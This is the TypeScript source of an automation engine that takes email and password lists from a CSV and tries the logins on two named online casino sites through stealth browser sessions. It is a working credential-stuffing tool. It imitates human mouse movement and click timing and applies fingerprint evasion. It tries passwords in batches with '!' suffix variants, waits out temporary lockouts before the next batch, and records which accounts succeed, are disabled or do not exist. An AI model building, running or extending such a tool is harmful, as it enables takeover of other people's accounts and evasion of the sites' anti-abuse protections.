/**
 * AUTOMATION ENGINE
 * EventEmitter-based core that processes each CSV row through Browserbase.
 * Emits real-time events for the GUI server to relay over WebSocket.
 *
 * Login flow: smart response detection with multi-password retry sequences.
 * Response-based waits (networkidle + 500ms) instead of hardcoded timers.
 */

import { EventEmitter } from "events";
import Browserbase from "@browserbasehq/sdk";
import { type Page } from "playwright-core";
import pLimit from "p-limit";
import * as fs from "fs";
import * as path from "path";
import { applyStealth } from "./stealth";
import { createSession, BACKEND, PROXY_INFO, type SessionHandle } from "./cloak-backend";

// ─── Types ────────────────────────────────────────────────────────────────────

export interface Credential {
  email: string;
  passwords: string[];  // All passwords from CSV columns in order (B, C, D, E, F, G, ...)
}

export interface SiteConfig {
  name: string;
  url: string;
  selectors: {
    username: string;
    password: string;
    submit: string;
  };
}

export type Outcome =
  | "queued"
  | "testing"
  | "success"        // Login flow completed — no "incorrect" detected
  | "noaccount"      // All password attempts returned "incorrect"
  | "permdisabled"   // "been disabled" detected — permanent
  | "tempdisabled"   // "temporarily disabled" — 1hr cooldown
  | "N/A";           // Session/page crash

export interface SiteStatus {
  outcome: Outcome;
  attempts: number;
  error?: string;
}

export interface RowStatus {
  rowIndex: number;
  email: string;
  status: "queued" | "testing" | "done" | "skipped";
  sites: { [siteName: string]: SiteStatus };
  sessionId?: string;
  recordingUrl?: string;
  currentBatch: number;            // which batch of 3 passwords (0-indexed)
  scheduledRetestAt?: string;      // ISO timestamp — retest with next batch after cooldown
  tempDisabledUntil?: string;      // ISO timestamp — skip until this time
}

export interface EngineConfig {
  apiKey: string;
  projectId: string;
  concurrency: number;
  maxRetries: number;
  targets: SiteConfig[];
}

// ─── Custom Errors ────────────────────────────────────────────────────────────

class PermDisabledError extends Error {
  constructor() {
    super("Account permanently disabled");
    this.name = "PermDisabledError";
  }
}

class TempDisabledError extends Error {
  constructor() {
    super("Account temporarily disabled — 1hr cooldown");
    this.name = "TempDisabledError";
  }
}

// ─── Response Types ───────────────────────────────────────────────────────────

type LoginResponse = "incorrect" | "disabled" | "tempdisabled" | "other" | "timeout";

// ─── Default Targets ──────────────────────────────────────────────────────────

export const DEFAULT_TARGETS: SiteConfig[] = [
  {
    name: "joe",
    url: "https://www.joefortunepokies.win/login",
    selectors: {
      username: "#username",
      password: "#password",
      submit: "#loginSubmit",
    },
  },
  {
    name: "ignition",
    url: "https://www.ignitioncasino.ooo/login",
    selectors: {
      username: "#username",
      password: "#password",
      submit: "#loginSubmit",
    },
  },
];

// Concurrency policy: default 3, absolute max 5 (× 2 sites = 10 max sessions)
const DEFAULT_CONCURRENCY = 3;
const MAX_CONCURRENT_CREDENTIALS = 5;

// ─── Engine ───────────────────────────────────────────────────────────────────

export class AutomationEngine extends EventEmitter {
  private running = false;
  private shouldStop = false;
  private rows: RowStatus[] = [];

  get isRunning(): boolean {
    return this.running;
  }

  get rowStatuses(): RowStatus[] {
    return this.rows;
  }

  /** Parse credentials.csv into credential objects — reads ALL password columns dynamically */
  loadCredentials(csvPath: string): Credential[] {
    if (!fs.existsSync(csvPath)) return [];
    const content = fs.readFileSync(csvPath, "utf-8");
    const lines = content
      .split(/\r?\n/)
      .map((l) => l.trim())
      .filter((l) => l.length > 0);

    if (lines.length < 2) return [];

    const headers = lines[0].split(",").map((h) => h.trim().toLowerCase());
    const emailIdx = headers.indexOf("email");
    if (emailIdx < 0) return [];

    // Find all password columns in order: password, password2, password3, password4, ...
    const passwordIndices: number[] = [];
    for (let i = 0; i < headers.length; i++) {
      if (headers[i].startsWith("password")) {
        passwordIndices.push(i);
      }
    }
    // Sort by column number (password=1, password2=2, password3=3, ...)
    passwordIndices.sort((a, b) => {
      const numA = parseInt(headers[a].replace("password", "") || "1");
      const numB = parseInt(headers[b].replace("password", "") || "1");
      return numA - numB;
    });
    if (passwordIndices.length === 0) return [];

    const results: Credential[] = [];
    for (let i = 1; i < lines.length; i++) {
      const parts = this.parseCsvLine(lines[i]);
      const email = (parts[emailIdx] || "").trim();
      const allPasswords = passwordIndices.map((idx) => (parts[idx] || "").trim());
      // Trim trailing empty passwords but preserve internal order
      while (allPasswords.length > 0 && allPasswords[allPasswords.length - 1] === "") {
        allPasswords.pop();
      }
      if (email && allPasswords.length > 0) {
        results.push({ email, passwords: allPasswords });
      } else {
        console.warn(`[CSV] Row ${i + 1} skipped — missing ${!email ? "email" : "password"}`);
      }
    }
    return results;
  }

  /** Start the automation loop over all credentials */
  async start(credentials: Credential[], config: EngineConfig): Promise<void> {
    if (this.running) {
      this.log("WARN", "Engine is already running");
      return;
    }

    this.running = true;
    this.shouldStop = false;
    const { targets } = config;

    // Initialise row statuses
    this.rows = credentials.map((c, i) => ({
      rowIndex: i,
      email: c.email,
      status: "queued" as const,
      currentBatch: 0,
      sites: Object.fromEntries(
        targets.map((t) => [t.name, { outcome: "queued" as Outcome, attempts: 0 }])
      ),
    }));

    this.emit("started", {
      total: credentials.length,
      targets: targets.map((t) => t.name),
    });

    // Clamp concurrency: default 3, absolute max 5 — never exceeded
    const concurrency = Math.min(Math.max(config.concurrency || DEFAULT_CONCURRENCY, 1), MAX_CONCURRENT_CREDENTIALS);
    this.log("INFO", `Starting automation: ${credentials.length} credentials × ${targets.length} targets`);
    this.log("INFO", `Concurrency: ${concurrency} creds | Response-based waits`);

    // Browserbase backend uses the cloud API; cloak backend runs locally and skips it.
    const bb: Browserbase | null = BACKEND === "browserbase"
      ? new Browserbase({ apiKey: config.apiKey })
      : null;
    if (BACKEND === "cloak") {
      this.log("INFO", `Backend: cloak (local CloakBrowser) | proxy: ${PROXY_INFO}`);
    }
    const limit = pLimit(concurrency);
    let batchSlot = 0;

    // Kill any stale sessions from previous runs (browserbase only)
    if (bb) await this.cleanupStaleSessions(bb, config.projectId);

    const tasks = credentials.map((cred, idx) =>
      limit(async () => {
        if (this.shouldStop) {
          this.rows[idx].status = "skipped";
          for (const t of targets) this.rows[idx].sites[t.name].outcome = "N/A";
          this.emitRowUpdate(idx);
          return;
        }

        // Check tempdisabled cooldown
        if (this.rows[idx].tempDisabledUntil) {
          const until = new Date(this.rows[idx].tempDisabledUntil!).getTime();
          if (Date.now() < until) {
            this.rows[idx].status = "skipped";
            for (const t of targets) {
              this.rows[idx].sites[t.name].outcome = "tempdisabled";
            }
            this.log("WARN", `  Skipping ${cred.email} — tempdisabled until ${this.rows[idx].tempDisabledUntil}`);
            this.emitRowUpdate(idx);
            return;
          }
        }

        // Stagger session creation to avoid concurrent limit bursts
        const slot = batchSlot++;
        if (slot > 0) {
          const staggerMs = 2000 * (slot % concurrency);
          if (staggerMs > 0) {
            this.log("INFO", `  Stagger wait ${(staggerMs / 1000).toFixed(0)}s for slot ${slot}`);
            await this.sleep(staggerMs);
          }
        }

        // Mark row as testing
        this.rows[idx].status = "testing";
        this.emitRowUpdate(idx);
        this.log("INFO", `── Row ${idx + 1}/${credentials.length}: ${cred.email}`);

        let handle: SessionHandle | null = null;
        let credentialDisabled = false;  // tracks cross-site disabled state

        try {
          // Backend-agnostic session creation (browserbase cloud OR local cloakbrowser)
          handle = await createSession({
            bb: bb || undefined,
            projectId: config.projectId,
            viewport: { width: 1920, height: 1080 },
            slowMo: 250,
          });

          this.rows[idx].sessionId = handle.sessionId;
          this.rows[idx].recordingUrl = handle.recordingUrl;
          const seedTag = handle.fingerprintSeed != null ? ` seed=${handle.fingerprintSeed}` : "";
          this.log("INFO", `  Session: ${handle.sessionId}${seedTag}`);

          const page: Page = handle.page;
          page.setDefaultTimeout(30000);

          // CloakBrowser ships native C++ patches — layering JS-Proxy stealth on top
          // raises the tampering signal. Only apply for browserbase backend.
          if (BACKEND !== "cloak") {
            const stealthProfile = await applyStealth(page);
            this.log("INFO", `  Stealth: Chrome ${stealthProfile.major} / ${stealthProfile.cores}c / ${stealthProfile.memory}GB`);
          } else {
            this.log("INFO", `  Stealth: cloakbrowser native (C++ patches)`);
          }

          // Disable CSS Animations for speed
          await page.addStyleTag({ content: '* { transition: none !important; animation: none !important; scroll-behavior: auto !important; }' });

          // Process each target site SEQUENTIALLY
          for (const target of targets) {
            if (this.shouldStop || credentialDisabled) break;

            this.rows[idx].sites[target.name].outcome = "testing";
            this.emitRowUpdate(idx);
            this.log("INFO", `  ${target.name}: starting login flow...`);

            try {
              const result = await this.executeLoginFlow(page, target, cred, this.rows[idx].currentBatch);
              this.rows[idx].sites[target.name].outcome = result.outcome;
              this.rows[idx].sites[target.name].attempts = result.attempts;
              this.log(
                result.outcome === "success" ? "OK" : "WARN",
                `  → ${target.name}: ${result.outcome} (${result.attempts} attempt${result.attempts !== 1 ? "s" : ""})`
              );

              // Cross-site propagation: disabled/tempdisabled stops both sites
              if (result.outcome === "permdisabled") {
                credentialDisabled = true;
                for (const t of targets) {
                  if (this.rows[idx].sites[t.name].outcome === "queued" || this.rows[idx].sites[t.name].outcome === "testing") {
                    this.rows[idx].sites[t.name].outcome = "permdisabled";
                  }
                }
                this.log("ERR", `  🚫 ${cred.email}: PERMANENTLY DISABLED — skipping all sites`);
              } else if (result.outcome === "tempdisabled") {
                credentialDisabled = true;
                this.rows[idx].tempDisabledUntil = new Date(Date.now() + 60 * 60 * 1000).toISOString();
                this.rows[idx].currentBatch++;  // advance to next batch for retest
                for (const t of targets) {
                  if (this.rows[idx].sites[t.name].outcome === "queued" || this.rows[idx].sites[t.name].outcome === "testing") {
                    this.rows[idx].sites[t.name].outcome = "tempdisabled";
                  }
                }
                this.log("WARN", `  ⏳ ${cred.email}: TEMPORARILY DISABLED — 1hr cooldown (next batch: ${this.rows[idx].currentBatch})`);
              }
            } catch (e: any) {
              const errMsg = e.message || String(e);
              if (e instanceof PermDisabledError) {
                this.rows[idx].sites[target.name].outcome = "permdisabled";
                credentialDisabled = true;
                for (const t of targets) {
                  if (this.rows[idx].sites[t.name].outcome === "queued" || this.rows[idx].sites[t.name].outcome === "testing") {
                    this.rows[idx].sites[t.name].outcome = "permdisabled";
                  }
                }
                this.log("ERR", `  🚫 ${cred.email}: PERMANENTLY DISABLED`);
              } else if (e instanceof TempDisabledError) {
                this.rows[idx].sites[target.name].outcome = "tempdisabled";
                credentialDisabled = true;
                this.rows[idx].tempDisabledUntil = new Date(Date.now() + 60 * 60 * 1000).toISOString();
                this.rows[idx].currentBatch++;  // advance to next batch for retest
                for (const t of targets) {
                  if (this.rows[idx].sites[t.name].outcome === "queued" || this.rows[idx].sites[t.name].outcome === "testing") {
                    this.rows[idx].sites[t.name].outcome = "tempdisabled";
                  }
                }
                this.log("WARN", `  ⏳ ${cred.email}: TEMPORARILY DISABLED — 1hr cooldown (next batch: ${this.rows[idx].currentBatch})`);
              } else {
                this.rows[idx].sites[target.name].outcome = "N/A";
                this.rows[idx].sites[target.name].error = errMsg;
                this.log("ERR", `  ✗ ${target.name}: ${errMsg.substring(0, 100)}`);
              }
            }

            this.emitRowUpdate(idx);
          }

          await handle.close().catch(() => { });
          handle = null;
          if (bb && this.rows[idx].sessionId) {
            await bb.sessions.update(this.rows[idx].sessionId!, { status: "REQUEST_RELEASE" }).catch(() => { });
          }
          this.log("INFO", `  Session closed: ${this.rows[idx].sessionId}`);
        } catch (e: any) {
          this.log("ERR", `  Session error: ${(e.message || String(e)).substring(0, 120)}`);
          for (const target of targets) {
            const s = this.rows[idx].sites[target.name];
            if (s.outcome === "queued" || s.outcome === "testing") {
              s.outcome = "N/A";
              s.error = e.message || String(e);
            }
          }
          if (handle) await handle.close().catch(() => { });
          if (bb && this.rows[idx].sessionId) {
            await bb.sessions.update(this.rows[idx].sessionId!, { status: "REQUEST_RELEASE" }).catch(() => { });
          }
        }

        this.rows[idx].status = "done";
        this.emitRowUpdate(idx);

        // Write incremental results after each row (append mode)
        this.writeRowResultCSV(targets, this.rows[idx], idx === 0);
      })
    );

    await Promise.allSettled(tasks);

    // Final complete CSV (overwrite incremental with clean version)
    this.writeResultsCSV(targets);

    this.running = false;
    this.emit("complete", { rows: this.rows });
    this.log("INFO", "═══ Automation complete ═══");
  }

  /** Gracefully stop the engine after current tasks finish */
  stop(): void {
    if (!this.running) return;
    this.shouldStop = true;
    this.log("WARN", "Stop requested — finishing active sessions...");
    this.emit("stopping");
  }

  // ─── Private ──────────────────────────────────────────────────────────────

  /** Kill all running sessions from previous runs to free up concurrent slots */
  private async cleanupStaleSessions(bb: Browserbase, projectId: string): Promise<void> {
    try {
      this.log("INFO", "Cleaning up stale sessions...");
      const timeoutPromise = this.sleep(15000).then(() => { throw new Error("Cleanup timed out after 15s"); });
      const cleanupPromise = (async () => {
        const sessions = await bb.sessions.list({ status: "RUNNING" });
        const stale: string[] = [];
        let totalSeen = 0;
        for await (const session of sessions) {
          totalSeen++;
          if (session.projectId === projectId) {
            stale.push(session.id);
          }
        }
        this.log("INFO", `Scanned ${totalSeen} running session(s), ${stale.length} match this project`);
        if (stale.length === 0) {
          this.log("INFO", "No stale sessions found");
          return;
        }
        this.log("WARN", `Found ${stale.length} stale session(s) — releasing...`);
        for (const id of stale) {
          await bb.sessions.update(id, { status: "REQUEST_RELEASE" }).catch(() => { });
        }
        await this.sleep(3000);
        this.log("INFO", `Cleaned up ${stale.length} stale session(s)`);
      })();
      await Promise.race([cleanupPromise, timeoutPromise]);
    } catch (e: any) {
      this.log("WARN", `Session cleanup failed: ${(e.message || String(e)).substring(0, 80)}`);
    }
  }

  /**
   * Build the password attempt sequence for a given batch.
   * Each batch uses 3 passwords from the credential's password list.
   * Batch 0: passwords[0..2], Batch 1: passwords[3..5], Batch 2: passwords[6..8], etc.
   * Incomplete batches padded with !/?!! on the last available password.
   * 4th attempt is always a re-press of the 3rd (buffer for tempdisabled trigger).
   * Returns empty array if no passwords available for this batch.
   */
  private buildPasswordSequence(passwords: string[], batchIndex: number): string[] {
    const startIdx = batchIndex * 3;
    const raw = passwords.slice(startIdx, startIdx + 3).filter((p) => p.length > 0);
    if (raw.length === 0) return []; // no more passwords for this batch

    // Pad to 3 using ! and !! suffixes on the last available password
    const batch = [...raw];
    while (batch.length < 3) {
      const lastPw = raw[raw.length - 1];
      batch.push(lastPw + (batch.length === raw.length ? "!" : "!!"));
    }

    // 4th attempt = re-press of 3rd (buffer for tempdisabled trigger)
    return [...batch, batch[2]];
  }

  /**
   * Wait for the site to respond after a login button press.
   * Watches for page content changes, waits for networkidle + 500ms.
   * Returns the detected response type.
   */
  private async waitForLoginResponse(page: Page, timeoutMs: number = 15000): Promise<LoginResponse> {
    try {
      // Wait for DOM to load (avoids networkidle which can hang on infinite websockets)
      await page.waitForLoadState("domcontentloaded", { timeout: timeoutMs });
    } catch {
      // Timeout waiting for load — treat as timeout
      return "timeout";
    }

    // Extra 500ms for late-loading DOM updates
    await this.sleep(500);

    // Read page content and check for known response phrases in-browser (faster than page.content())
    try {
      const response = await page.evaluate(() => {
        const text = document.body?.innerText?.toLowerCase() || "";
        if (text.includes("been disabled")) return "disabled";
        if (text.includes("temporarily disabled")) return "tempdisabled";
        if (text.includes("incorrect")) return "incorrect";
        return "other";
      }) as LoginResponse;
      return response;
    } catch {
      return "timeout";
    }
  }

  /**
   * Execute the full login flow for a single site with smart password retry.
   * Returns the final outcome and attempt count for this site.
   */
  private async executeLoginFlow(
    page: Page,
    site: SiteConfig,
    cred: Credential,
    batchIndex: number = 0
  ): Promise<{ outcome: Outcome, attempts: number }> {
    // ── Network response trap: scan response bodies for disabled/incorrect phrases ──
    let networkDetection: LoginResponse | null = null;
    const responseHandler = async (response: any) => {
      try {
        const ct = (response.headers()["content-type"] || "").toLowerCase();
        if (!ct.includes("text") && !ct.includes("json") && !ct.includes("html")) return;
        const body = await response.text();
        const lower = body.toLowerCase();
        if (lower.includes("temporarily disabled")) networkDetection = "tempdisabled";
        else if (lower.includes("been disabled")) networkDetection = "disabled";
        else if (lower.includes("incorrect")) networkDetection = "incorrect";
      } catch { /* non-text response — ignore */ }
    };
    page.on("response", responseHandler);

    // ── Shadow-DOM-aware MutationObserver: install once per page, runs on every doc ──
    if (!(page as any).__casinoObserverInstalled) {
      await page.addInitScript(() => {
        (window as any).__casinoStatus = null;
        const install = () => {
          if (!document.body) { requestAnimationFrame(install); return; }
          const findInShadows = (root: any) => {
            if (!root || (window as any).__casinoStatus) return;
            const text = (root.textContent || "").toLowerCase();
            if (text.includes("temporarily disabled")) (window as any).__casinoStatus = "tempdisabled";
            else if (text.includes("been disabled")) (window as any).__casinoStatus = "disabled";
            else if (text.includes("incorrect")) (window as any).__casinoStatus = "incorrect";
            if ((window as any).__casinoStatus) return;
            try {
              const walker = document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT);
              let node: any = walker.nextNode();
              while (node) {
                if (node.shadowRoot) findInShadows(node.shadowRoot);
                node = walker.nextNode();
              }
            } catch { /* walker failed — give up this branch */ }
          };
          const observer = new MutationObserver(() => findInShadows(document.body));
          observer.observe(document.body, { childList: true, subtree: true, characterData: true });
          findInShadows(document.body);
        };
        install();
      });
      (page as any).__casinoObserverInstalled = true;
    }

    try {
      return await this.executeLoginFlowInner(page, site, cred, batchIndex, () => networkDetection, () => { networkDetection = null; });
    } finally {
      page.off("response", responseHandler);
    }
  }

  private async executeLoginFlowInner(
    page: Page,
    site: SiteConfig,
    cred: Credential,
    batchIndex: number,
    getNetworkDetection: () => LoginResponse | null,
    resetNetworkDetection: () => void
  ): Promise<{ outcome: Outcome, attempts: number }> {
    // ── Navigate to login page ──
    await page.goto(site.url, { waitUntil: "domcontentloaded", timeout: 30000 });
    await this.sleep(1000);

    // ── Dismiss cookie notices (site-specific first, then generic fallback) ──
    try {
      await page.locator('button', { hasText: /accept all/i }).first().click({ timeout: 3000 });
      this.log("INFO", `  🍪 Clicked "Accept All" cookie button`);
      await this.sleep(500);
    } catch {
      await this.dismissCookieNotice(page, site.name);
    }
    await this.sleep(500);
    await this.captureScreenshot(page, `${site.name}:page-loaded`);

    // ── Resolve selectors (configured first, auto-detect fallback) ──
    const selectors = await this.resolveSelectors(page, site);

    // ── Random Mouse Movements & Scrolling (Behavioral Emulation) ──
    await page.mouse.move(100 + Math.random() * 500, 100 + Math.random() * 500);
    await this.sleep(100 + Math.random() * 200);
    await page.mouse.wheel(0, 100 + Math.random() * 200);
    await this.sleep(200 + Math.random() * 300);
    await page.mouse.wheel(0, -(50 + Math.random() * 100)); // scroll back up a bit
    await this.sleep(100 + Math.random() * 200);

    // ── Fill email (fast autofill) ──
    await page.fill(selectors.username, cred.email);
    await this.sleep(500);
    await this.captureScreenshot(page, `${site.name}:email-filled`);

    // ── Build password sequence ──
    const passwords = this.buildPasswordSequence(cred.passwords, batchIndex);
    if (passwords.length === 0) {
      this.log("WARN", `  ${site.name}: no passwords available for batch ${batchIndex} — skipping`);
      return { outcome: "noaccount", attempts: 0 };
    }
    const hasAltPw = cred.passwords.length > 1;
    this.log("INFO", `  ${site.name}: batch ${batchIndex} · ${hasAltPw ? "multi-password" : "single + fallbacks"} \u2014 ${passwords.length} attempts`);

    // ── Password retry loop ──
    for (let attemptIdx = 0; attemptIdx < passwords.length; attemptIdx++) {
      const pw = passwords[attemptIdx];
      const attemptNum = attemptIdx + 1;
      const isRetry = attemptIdx === 3; // 4th attempt is a re-press of same password

      if (!isRetry) {
        // Fill password field with new password (fast autofill)
        await page.fill(selectors.password, pw);
        await this.sleep(500);
        this.log("INFO", `  ${site.name} attempt ${attemptNum}/4: ${pw.substring(0, 3)}***`);
      } else {
        this.log("INFO", `  ${site.name} attempt ${attemptNum}/4: re-pressing login`);
      }

      // ── Final cookie check right before first submit (catches late banners) ──
      if (attemptIdx === 0) {
        await this.dismissCookieNotice(page, site.name);
      }

      // ── Reset detection state before submit (race starts on click) ──
      resetNetworkDetection();
      await page.evaluate(() => { (window as any).__casinoStatus = null; }).catch(() => { });

      // ── Press login button with human hover ──
      await page.hover(selectors.submit);
      await this.sleep(100 + Math.random() * 200);
      await page.click(selectors.submit, { delay: 30 + Math.random() * 50 });

      // ── Fast-poll race: network trap + Shadow-DOM observer (500ms window) ──
      // Catches verdicts before tab redirects/closes on success or error overlays
      let fastStatus: LoginResponse | null = null;
      const pollStart = Date.now();
      const uiRace = page.waitForFunction(
        () => (window as any).__casinoStatus,
        null,
        { timeout: 500, polling: 25 }
      ).then(async (h) => (await h.jsonValue()) as LoginResponse).catch(() => null);
      while (Date.now() - pollStart < 500) {
        if (page.isClosed()) break;
        const net = getNetworkDetection();
        if (net) { fastStatus = net; break; }
        await new Promise((r) => setTimeout(r, 5));
      }
      if (!fastStatus) fastStatus = (await uiRace) || getNetworkDetection();
      if (fastStatus) {
        this.log("INFO", `  ${site.name}: fast-detected "${fastStatus}" in ${Date.now() - pollStart}ms`);
      }

      // ── Fall back to slower DOM scan if fast race didn't catch anything ──
      const timeout = attemptIdx === 2 ? 5000 : 15000;
      const response: LoginResponse = fastStatus || await this.waitForLoginResponse(page, timeout);

      // ── Screenshot after response ──
      await this.sleep(500);
      await this.captureScreenshot(page, `${site.name}:attempt-${attemptNum}-${response}`);

      // ── Handle response ──
      if (response === "disabled") {
        throw new PermDisabledError();
      }

      if (response === "tempdisabled") {
        throw new TempDisabledError();
      }

      // response === "incorrect", "timeout", or "other"
      if (attemptNum < 4) {
        this.log("WARN", `  ${site.name}: ${response} on attempt ${attemptNum} \u2014 trying next password`);
      } else {
        // 4th attempt still incorrect/timeout \u2192 no_account
        this.log("WARN", `  ${site.name}: ${response} on attempt 4 \u2014 confirmed no_account`);
        return { outcome: "noaccount", attempts: attemptNum };
      }
    }

    // Should not reach here, but safety fallback
    return { outcome: "noaccount", attempts: passwords.length };
  }

  /** Site-specific cookie selectors (calibrated per target) */
  private static readonly SITE_COOKIE_SELECTORS: { [site: string]: string[] } = {
    joe: [
      'button:has-text("ACCEPT ALL")',
      'button:has-text("Accept All")',
      'button:has-text("Accept all")',
    ],
    ignition: [
      'button:has-text("ACCEPT ALL")',
      'button:has-text("Accept All")',
      'button:has-text("Accept all")',
    ],
  };

  /** Generic fallback cookie selectors */
  private static readonly GENERIC_COOKIE_SELECTORS = [
    'button:has-text("Accept")',
    'button:has-text("Accept Cookies")',
    'button:has-text("Allow All")',
    'button:has-text("Allow all")',
    'button:has-text("Agree")',
    'button:has-text("I Agree")',
    'button:has-text("Got it")',
    'button:has-text("OK")',
    'a:has-text("Accept")',
    'a:has-text("Accept All")',
    '#onetrust-accept-btn-handler',
    '#CybotCookiebotDialogBodyLevelButtonLevelOptinAllowAll',
    '#cookie-accept',
    '#accept-cookies',
    '#acceptCookies',
    '#gdpr-accept',
    '.cookie-accept',
    '.accept-cookies',
    '[aria-label="Accept"]',
    '[aria-label="Accept All"]',
    '[aria-label="Accept cookies"]',
    '[data-action="accept"]',
    '[data-cookie-accept]',
    '[data-testid="cookie-accept"]',
  ];

  /** Dismiss cookie consent banners — site-specific first, generic fallback */
  private async dismissCookieNotice(page: Page, siteName: string): Promise<void> {
    // Try site-specific selectors first (fast path)
    const siteSelectors = AutomationEngine.SITE_COOKIE_SELECTORS[siteName] || [];
    for (const selector of siteSelectors) {
      try {
        const btn = page.locator(selector).first();
        if (await btn.isVisible({ timeout: 300 })) {
          await btn.click();
          this.log("INFO", `  🍪 Dismissed cookie notice via calibrated: ${selector}`);
          await this.sleep(500);
          return;
        }
      } catch {
        // Selector didn't match — try next
      }
    }

    // Fallback to generic selectors
    for (const selector of AutomationEngine.GENERIC_COOKIE_SELECTORS) {
      try {
        const btn = page.locator(selector).first();
        if (await btn.isVisible({ timeout: 200 })) {
          await btn.click();
          this.log("INFO", `  🍪 Dismissed cookie notice via fallback: ${selector}`);
          await this.sleep(500);
          return;
        }
      } catch {
        // Selector didn't match — try next
      }
    }
  }

  /** Capture a screenshot, save to disk under screenshots/, and emit it as a log event */
  private async captureScreenshot(page: Page, label: string): Promise<void> {
    try {
      const buf = await page.screenshot({ type: "jpeg", quality: 70 });
      const b64 = buf.toString("base64");
      const dir = path.join(process.cwd(), "screenshots");
      if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
      const ts = new Date().toISOString().replace(/[:.]/g, "-");
      const safeLabel = label.replace(/[^a-zA-Z0-9._-]+/g, "_");
      const filePath = path.join(dir, `${ts}_${safeLabel}.jpg`);
      fs.writeFileSync(filePath, buf);
      this.emit("screenshot", { label, base64: b64, timestamp: new Date().toISOString(), path: filePath });
      this.log("SNAP", `📸 ${label} → ${path.relative(process.cwd(), filePath)}`);
    } catch {
      this.log("WARN", `Screenshot failed: ${label}`);
    }
  }

  private writeResultsCSV(targets: SiteConfig[]): void {
    const header = "email,site,outcome,attempts,sessionId,recordingUrl,error";
    const lines = [header];
    for (const row of this.rows) {
      for (const target of targets) {
        const s = row.sites[target.name];
        const err = this.stripAnsi((s.error || "").replace(/"/g, "'").replace(/[\r\n]+/g, " ")).substring(0, 200);
        lines.push(
          `${row.email},${target.name},${s.outcome},${s.attempts},${row.sessionId || ""},${row.recordingUrl || ""},"${err}"`
        );
      }
    }
    fs.writeFileSync("results.csv", lines.join("\n"), "utf-8");
    this.log("INFO", `Results saved to results.csv`);
  }

  /** Write a single row's results to CSV incrementally (append mode, write header on first row) */
  private writeRowResultCSV(targets: SiteConfig[], row: RowStatus, isFirst: boolean): void {
    try {
      const header = "email,site,outcome,attempts,sessionId,recordingUrl,error";
      const lines: string[] = [];
      if (isFirst) lines.push(header);
      for (const target of targets) {
        const s = row.sites[target.name];
        const err = this.stripAnsi((s.error || "").replace(/"/g, "'").replace(/[\r\n]+/g, " ")).substring(0, 200);
        lines.push(
          `${row.email},${target.name},${s.outcome},${s.attempts},${row.sessionId || ""},${row.recordingUrl || ""},"${err}"`
        );
      }
      fs.appendFileSync("results.csv", (isFirst ? "" : "\n") + lines.join("\n"), "utf-8");
    } catch {
      this.log("WARN", `Failed to write incremental result for ${row.email}`);
    }
  }

  private emitRowUpdate(idx: number): void {
    this.emit("row-update", JSON.parse(JSON.stringify(this.rows[idx])));
  }

  private log(level: string, message: string): void {
    this.emit("log", {
      level,
      message,
      timestamp: new Date().toISOString(),
    });
  }

  private sleep(ms: number): Promise<void> {
    return new Promise((r) => setTimeout(r, ms));
  }

  /** Strip ANSI escape codes from strings */
  private stripAnsi(str: string): string {
    return str.replace(/\u001b\[[0-9;]*m/g, "");
  }

  /** Parse a single CSV line respecting quoted fields (RFC 4180 compatible, accepts both formats) */
  private parseCsvLine(line: string): string[] {
    const fields: string[] = [];
    let current = "";
    let inQuotes = false;
    for (let i = 0; i < line.length; i++) {
      const ch = line[i];
      if (inQuotes) {
        if (ch === '"') {
          if (i + 1 < line.length && line[i + 1] === '"') {
            current += '"';
            i++; // skip escaped quote
          } else {
            inQuotes = false;
          }
        } else {
          current += ch;
        }
      } else {
        if (ch === '"') {
          inQuotes = true;
        } else if (ch === ",") {
          fields.push(current);
          current = "";
        } else {
          current += ch;
        }
      }
    }
    fields.push(current);
    return fields;
  }

  /**
   * Resolve selectors for a site — try configured selectors first,
   * auto-detect visible inputs as fallback when page loaded but selectors changed.
   */
  private async resolveSelectors(
    page: Page,
    site: SiteConfig
  ): Promise<{ username: string; password: string; submit: string }> {
    // Try configured selectors
    try {
      const [uVis, pVis, sVis] = await Promise.all([
        page.locator(site.selectors.username).first().isVisible({ timeout: 2000 }).catch(() => false),
        page.locator(site.selectors.password).first().isVisible({ timeout: 2000 }).catch(() => false),
        page.locator(site.selectors.submit).first().isVisible({ timeout: 2000 }).catch(() => false),
      ]);
      if (uVis && pVis && sVis) {
        this.log("INFO", `  ${site.name}: configured selectors found`);
        return site.selectors;
      }
      this.log("WARN", `  ${site.name}: configured selectors missing (user=${uVis} pass=${pVis} submit=${sVis}) \u2014 auto-detecting...`);
    } catch {
      this.log("WARN", `  ${site.name}: selector check failed \u2014 auto-detecting...`);
    }

    // Auto-detect fallback
    const usernameCandidates = [
      'input[type="email"]', 'input[type="text"]', 'input[name="email"]',
      'input[name="username"]', 'input[placeholder*="mail" i]', 'input[placeholder*="user" i]',
      'input[autocomplete="email"]', 'input[autocomplete="username"]',
    ];
    const passwordCandidates = [
      'input[type="password"]', 'input[name="password"]',
    ];
    const submitCandidates = [
      'button[type="submit"]', 'input[type="submit"]',
      'button:has-text("Log In")', 'button:has-text("Login")',
      'button:has-text("Sign In")', 'button:has-text("LOG IN")',
      'button:has-text("SIGN IN")',
    ];

    const username = await this.findFirstVisible(page, usernameCandidates);
    const password = await this.findFirstVisible(page, passwordCandidates);
    const submit = await this.findFirstVisible(page, submitCandidates);

    if (!username || !password || !submit) {
      throw new Error(`Auto-detect failed for ${site.name}: username=${!!username} password=${!!password} submit=${!!submit}`);
    }

    this.log("INFO", `  ${site.name}: auto-detected selectors: ${username}, ${password}, ${submit}`);
    return { username, password, submit };
  }

  /** Find the first visible element from a list of candidate selectors */
  private async findFirstVisible(page: Page, candidates: string[]): Promise<string | null> {
    for (const sel of candidates) {
      try {
        if (await page.locator(sel).first().isVisible({ timeout: 500 })) {
          return sel;
        }
      } catch {
        // not found
      }
    }
    return null;
  }
}
